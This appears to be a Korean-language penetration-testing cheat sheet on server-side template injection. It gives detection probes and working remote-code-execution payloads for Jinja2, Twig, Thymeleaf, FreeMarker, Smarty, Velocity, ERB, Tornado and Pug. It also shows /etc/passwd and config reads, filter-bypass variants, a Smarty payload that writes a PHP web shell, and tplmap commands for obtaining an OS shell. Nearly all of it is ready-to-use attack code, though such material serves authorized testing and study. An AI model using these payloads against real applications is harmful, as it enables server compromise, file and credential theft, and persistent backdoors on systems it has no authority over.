---
sidebar_position: 6
---

# Server-Side Template Injection (SSTI)

## 기본 개념

템플릿 엔진이 사용자 입력을 안전하지 않게 처리할 때 발생하는 취약점입니다.

## Fuzz String

> https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti

```
${{<%[%'"}}%\.
```

## 템플릿 엔진 탐지

```
# 기본 테스트
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}

# 결과로 엔진 식별
49 → 대부분의 템플릿 엔진
7*7 → 템플릿이 아님
```

## Jinja2 (Python/Flask)

### Magic Payload

> https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

```python
# 모든 서브클래스 확인
{​{ ''.__class__.__mro__[1].__subclasses__() }​}

# 특정 클래스 찾기 (예: subprocess.Popen)
{​{ ''.__class__.__mro__[1].__subclasses__()[396] }​}

# RCE
{​{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate() }​}
```

### 파일 읽기

```python
{​{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }​}
```

### Config 읽기

```python
{​{ config }​}
{​{ config.items() }​}
{​{ self.__dict__ }​}
```

## Twig (PHP)

```php
{{7*7}}           # 49
{{7*'7'}}         # 7777777
{{dump(app)}}     # 설정 정보
{{app.request.server.all|join(',')}}  # 환경 변수
```

### RCE

```php
# Payload 1
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

# Payload 2
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

## Thymeleaf (Java/Spring)

```java
${7*7}            # 49
${T(java.lang.Runtime).getRuntime().exec('calc')}
*{T(java.lang.Runtime).getRuntime().exec('calc')}
```

## FreeMarker (Java)

```java
${7*7}            # 49
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
[#assign ex='freemarker.template.utility.Execute'?new()]${ ex('id')}
```

## Smarty (PHP)

```php
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

## Velocity (Java)

```java
#set($x='')+$x.class.forName('java.lang.Runtime').getRuntime().exec('id')
```

## ERB (Ruby)

```ruby
<%= 7*7 %>        # 49
<%= system('whoami') %>
<%= `whoami` %>
<%= File.open('/etc/passwd').read %>
```

## Tornado (Python)

```python
{{7*7}}
{% import os %}{{os.system('whoami')}}
```

## Django (Python)

```python
{{7*7}}           # 일반적으로 실행 안됨 (안전)
{% debug %}       # 디버그 정보
```

## Pug (Node.js)

```javascript
= 7*7             # 49
= process.env
- var x = root.process
- x.mainModule.require('child_process').exec('whoami')
```

## 우회 기법

### 공백 우회

```python
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}
```

### 따옴표 우회

```python
{{request.application.__globals__.__builtins__.__import__(request.args.x).system(request.args.c)}}&x=os&c=whoami
```

### 필터 우회

```python
{{'__cla'+'ss__'}}
{{''['__cla''ss__']}}
```

## 탐지 및 익스플로잇 도구

### tplmap

```bash
# 자동 탐지 및 익스플로잇
./tplmap.py -u 'http://<RHOST>/?name=test'

# POST 요청
./tplmap.py -u 'http://<RHOST>/' -d 'name=test'

# 쉘 획득
./tplmap.py -u 'http://<RHOST>/?name=test' --os-shell
```

## 참고

- SSTI는 RCE로 이어질 수 있음
- 각 템플릿 엔진마다 페이로드가 다름
- `{{7*7}}` 같은 기본 테스트로 탐지
- Jinja2가 가장 흔함 (Python/Flask)
- Sandbox 우회 필요할 수 있음
- 파일 읽기, 설정 노출, RCE 가능
